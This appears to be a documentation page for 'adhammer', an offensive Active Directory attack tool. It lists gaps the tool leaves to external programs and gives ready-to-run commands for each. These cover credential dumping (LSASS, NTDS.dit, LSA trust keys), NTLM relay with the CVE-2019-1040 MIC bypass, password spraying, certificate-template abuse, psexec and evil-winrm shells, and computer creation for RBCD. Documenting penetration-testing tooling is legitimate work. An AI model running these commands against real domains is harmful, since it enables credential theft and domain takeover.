# adhammer — external-tool cheat-sheet

adhammer covers a broad AD-attack surface end-to-end, but a few steps live
elsewhere by design. For each known gap we ship an inline `[hint]` block at
the site (see `cli/src/gap_hint.rs`) and this page holds the "why" and the
typical invocation.

**Philosophy:** we improve where adhammer is strong, and where we're not,
we point at the tool that already does it well — rather than
half-reimplementing the world. Every gap on this page satisfies at least one
of: (a) violates the on-prem-only / S-tier-minimalism / dual-use hard rules,
(b) blocked on a sibling-crate primitive not yet published, (c) needs
per-OS/kernel offset work that belongs in a specialist tool.

Runtime discovery:

```sh
adhammer gaps              # list all rows with docs anchors
```

Inline hint format (stable — scripts can grep `[hint]`):

```
[hint] this step is a known adhammer gap: <one-line rationale>
[hint] external tool: <copy-pasteable command with your captured params>
[hint] see docs/GAPS.md#<anchor> for the full table
```

Hints are printed to **stderr** so `--json` stdout stays pure.

## Table

| # | Gap | External tool | Why we don't do this |
|---|---|---|---|
| 1 | [LDAPS client-cert bind](#f1b-ldap-pfx-auth) | `certipy auth -pfx` | ldap3 exposes no client-cert TLS path (F1b — deferred) |
| 2 | [Offline LSASS parse](#f5-lsass-minidump) | `pypykatz lsa minidump` | per-OS struct-offset work (F5 — deferred) |
| 3 | [KDBX / KeePass crack](#kdbx-crack) | `keepass2john` + `hashcat` | out of scope (not AD/Windows-native) |
| 4 | [Offline NTDS.dit crack](#ntds-dit-offline) | `impacket-secretsdump LOCAL` | live drsuapi path is our lane (`attack secretsdump`) |
| 5 | [LSA trust-key dump](#f3-trust-dump) | `impacket-lsadump` | blocked on ms-lsad v0.3 (F3 — deferred) |
| 6 | [Sealed psexec / svcctl](#psexec-sealed) | `impacket-psexec` | STATUS_PIPE_BUSY reference-capture blocker (1.4.8) |
| 7 | [NTLM relay + SOCKS](#ntlm-relay-socks) | `impacket-ntlmrelayx --socks` | `attack relay` has no SOCKS listener yet |
| 8 | [BloodHound live collect](#bloodhound-collect) | `rusthound-ce` | live collector loop is a separate project (we emit the ZIP) |
| 9 | [Cert-template ACE grant](#template-ace-edit) | `certipy template -write-default-configuration` | template DACL write not wired (F2 covers the flag flip) |
| 10 | [PFX → PEM + CRT](#pfx-decode) | `openssl pkcs12` | avoids a pkcs12 dep for one file-format decode |
| 11 | [Pre-Win2000 mass spray](#pre2k-spray) | `nxc smb --pre2k` | no dedicated verb yet — 1.5.2 adds `attack pre2k` |
| 12 | [Change expired password](#expired-changepw) | `impacket-changepasswd` | SAMR ChangePassword2 verb wired but no CLI surface yet — 1.5.2 adds `attack changepasswd` |
| 13 | [Full PSRP runspace shell](#psrp-runspace) | `evil-winrm` | `--shell powershell` wraps single commands only; full PSRP is ~500 LOC — 1.6 |
| 14 | [HTTP-to-LDAPS relay + CVE-2019-1040](#relay-http-mic) | `impacket-ntlmrelayx --http-port ... --remove-mic` | `attack relay` is SMB-listener today; HTTP listener + MIC-strip is 1.5.2 |
| 15 | [Create computer via MachineAccountQuota](#create-computer) | `impacket-addcomputer` | RBCD trustee bootstrap; `attack abuse --create-computer` lands in 1.5.2 |

---

## F1b — LDAPS client-cert (schannel) bind {#f1b-ldap-pfx-auth}

**Why not built-in:** ldap3 (our LDAP client, 223 of 245 tree crates) does
not expose a rustls `ClientConfig` client-cert setter. Wiring PFX auth
would either fork ldap3 or switch the workspace TLS backend to native-tls
just for this path — F1b is deferred until one of those is worth doing.

**External tool:**

```sh
certipy auth -pfx <file.pfx> -dc-ip <dc-ip>
```

## F5 — offline LSASS minidump parse {#f5-lsass-minidump}

**Why not built-in:** `dpapi-offline` (our sibling) already has the crypto
primitives, but the LSASS memory walker needs per-OS struct offsets for
WDigest / MSV1_0 / TSPKG / Kerberos / SSP sections. That's ~2 engineering
days of Windows-SDK grunt-work; specialist tools do it well.

**External tool:**

```sh
pypykatz lsa minidump <lsass.dmp>
```

## KDBX / KeePass crack {#kdbx-crack}

**Why not built-in:** KeePass password brute is not an AD/Windows-native
attack surface. Adding Argon2d + ChaCha20 deps to adhammer for a puzzle-solve
step violates the S-tier minimalism rule. Belongs in hashcat/john.

**External tool:**

```sh
keepass2john <file.kdbx> > kdbx.hash
hashcat -m 13400 kdbx.hash <wordlist>
```

## Offline NTDS.dit crack {#ntds-dit-offline}

**Why not built-in:** adhammer's `attack secretsdump` runs the live
drsuapi path (`GetNCChanges`). The *offline* path (a `.dit` you pulled from
a backup / vshadow copy + `SYSTEM` hive) is a separate ESE-parser workstream
— `ese-parser` (icedracon) has the read side but not the NTDS row-decrypt
glue. Deferred.

**External tool:**

```sh
impacket-secretsdump -ntds <ntds.dit> -system <SYSTEM.hive> LOCAL
```

## F3 — LSA policy secret dump (cross-realm trust keys) {#f3-trust-dump}

**Why not built-in:** `LsarRetrievePrivateData` (opnum 43) lives in
ms-lsad's v0.3 roadmap and hasn't published yet. The `G$$<trust-domain>`
secret is *the* cross-forest primitive, so this WILL land — as F3 in 1.5.2.

**External tool:**

```sh
impacket-lsadump -target-ip <dc-ip> <DOMAIN>/<user>
```

## Sealed psexec / svcctl {#psexec-sealed}

**Why not built-in:** the sealed-Kerberos-RPC REQUEST path was cut in
1.4.8 (`STATUS_PIPE_BUSY 0xC00000AE`, unfixable without a Windows-native
Wireshark reference capture on `\PIPE\svcctl`). git history preserves the
scaffold at tag `v1.4.7`; will resurrect when the capture lands.

**External tool:**

```sh
impacket-psexec <DOMAIN>/<user>@<target-host>
```

## NTLM relay + SOCKS {#ntlm-relay-socks}

**Why not built-in:** `attack relay` handles single-target SMB→LDAP relay
today; a persistent multi-victim SOCKS proxy is a separate design
(listener + session-store + downstream connection reuse) not yet wired.
Impacket does it well; use it while our SOCKS listener bakes.

**External tool:**

```sh
impacket-ntlmrelayx -tf targets.txt -smb2support --socks
```

## BloodHound-CE live collect {#bloodhound-collect}

**Why not built-in:** adhammer emits a BloodHound-CE-compatible ingest ZIP
from `scan --out <path>.zip` — but the *live* collector loop (session
discovery, GPO walk, container recursion, computer-availability probe) is
its own project. We don't want to double-maintain a collector, so we point
at rusthound-ce (the Rust cousin) or the standard SharpHound.

**External tool:**

```sh
rusthound-ce -d <domain.local> -u <user> -p '<password>' -c All
```

## Cert-template ACE grant {#template-ace-edit}

**Why not built-in:** `attack esc4` flips template flags (F2 chain closes
ESC4→ESC1 end-to-end), but the DACL modify to grant `Enroll` on a template
requires an ACL-write path we haven't wired. Usually not needed — a
template becomes ESC1-vulnerable via the two flag flips alone, and if the
target isn't already broadly enrollable, `attack abuse` can add a member
to a group that IS.

**External tool:**

```sh
certipy template -template <TemplateName> -write-default-configuration
```

## PFX → PEM + CRT {#pfx-decode}

**Why not built-in:** decoding PKCS#12 needs a `p12` / `pkcs12` crate
dep — a big surface to add for one file-format convenience. Ships in a
follow-up (task #15) when we're ready to take the dep. `openssl` is
universal and one line.

**External tool:**

```sh
openssl pkcs12 -in <file.pfx> -nocerts -nodes -out x.key.pem
openssl pkcs12 -in <file.pfx> -clcerts -nokeys -out x.crt
adhammer kerb pkinit --key x.key.pem --cert x.crt \
  --user <UPN-SAM> --realm <REALM> --kdc <dc>
```

## Pre-Win2000 mass spray {#pre2k-spray}

**Why not built-in:** the *primitive* is already covered (`attack asktgt`
authenticates a single Pre-Win2000 account with a lowercased-SAM password
via RC4-HMAC), but there's no batch verb that reads a CSV of
`PASSWD_NOTREQD` computer accounts and tries each one. Discovered live
against an external live DC (2026-09-11) — the fastest path there is a mass spray of
computer accounts whose passwords still match the pre-provisioning
convention. Ships as `attack pre2k` in 1.5.2.

**External tool:**

```sh
nxc smb <dc-ip> --pre2k -u accounts.txt -p accounts.txt
```

## Change expired / pre-created password {#expired-changepw}

**Why not built-in:** the SAMR `SamrChangePassword2` primitive is wired in
[`ms-samr`], and adhammer's own `attack abuse --action set-password`
covers the *admin-rewrites-someone-else's-password* case. What's missing is
the *pre-created account whose password is expired and needs to change
itself over a session with no existing TGT* case — the flow used against
`PASSWORD_MUST_CHANGE`-flagged accounts. Ships as `attack changepasswd`
in 1.5.2.

**External tool:**

```sh
impacket-changepasswd <DOMAIN>/<user>@<dc-ip> -newpass '<new>'
```

## Full PSRP runspace shell {#psrp-runspace}

**Why not built-in:** `adhammer attack winrm --shell powershell` opens a
PowerShell shell type over WSMan (WS-Man `powershell` URI) and wraps a
single `powershell.exe -NoProfile -NonInteractive -Command` payload —
enough for one-off command execution against DCs that deny the `cmd`
shell type (Server 2019+ policy). What it doesn't do yet is drive a full
[MS-PSRP] runspace protocol (deserializing CLIXML, streaming pipeline
records, matching interactive REPL). That's ~500 LOC of protocol work,
tracked for 1.6.

**External tool:**

```sh
evil-winrm -i <target> -u <user> -p '<password>'
```

## HTTP-to-LDAPS relay + CVE-2019-1040 (--remove-mic) {#relay-http-mic}

**Why not built-in:** `adhammer attack relay` today runs an SMB listener
and relays inbound SMB auth onto a target of your choice. Two pieces are
still needed for the *coerce-over-HTTP → LDAP RBCD-write* chain used on
an external live DC:

1. **HTTP(S) listener** so `PetitPotam`/`printerbug` coercions with an
   `http://` UNC land somewhere (SMB coercion is often filtered egress
   through corporate firewalls; HTTP is not).
2. **`--remove-mic`** — CVE-2019-1040 MIC bypass — to make the relayed
   session pass an unsigned bind against LDAPS.

Both ship as `attack relay --listen-http --remove-mic --escalate-user
<sam>` in 1.5.2. Marked P0 for that milestone.

**External tool:**

```sh
impacket-ntlmrelayx -t ldaps://<dc> --http-port 80 \
  --remove-mic --escalate-user <sam> -smb2support
```

## Create computer via MachineAccountQuota {#create-computer}

**Why not built-in:** RBCD needs a controlled trustee — any account with
an SPN. The universal path is: use MachineAccountQuota (default 10 per
authenticated user) to add a new computer account and use *that* as the
`msDS-AllowedToActOnBehalfOfOtherIdentity` value. adhammer's `attack
abuse` covers the ACL write on the victim, but the *create the trustee*
step is a separate LDAP `add` + SAMR password-set that hasn't been
wrapped. Ships as `attack abuse --create-computer <name>` in 1.5.2.

**External tool:**

```sh
impacket-addcomputer -computer-name '<NAME>$' -computer-pass '<pw>' \
  -dc-ip <dc-ip> <DOMAIN>/<user>:'<password>'
```
